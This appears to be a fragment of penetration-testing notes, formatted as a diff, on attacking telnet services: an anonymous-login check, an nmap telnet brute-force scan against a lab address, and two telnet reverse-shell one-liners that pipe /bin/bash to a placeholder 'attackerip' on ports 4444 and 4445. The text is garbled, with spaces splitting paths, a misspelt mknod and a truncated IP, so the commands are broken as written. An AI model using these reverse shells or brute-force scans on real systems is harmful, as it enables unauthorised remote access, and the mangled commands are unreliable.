@@ -1,0 +1,12 @@
+
+Does it accept anonymous logins? 
+
+ls -l / usr / share / nmap / scripts / telnet * 
+
+nmap -p 23 --script = telnet-encryption.nse, telnet-brute.nse 10.11.1. 
+
+telnet attackerip 4444 | / bin / bash | telnet attackerip 4445 0 / backpipe | 
+
+telnet 
+
+mckod backpipe p && telnet attackerip 4445 0 / backpipe | / bin / bash 1> backpipe if not available
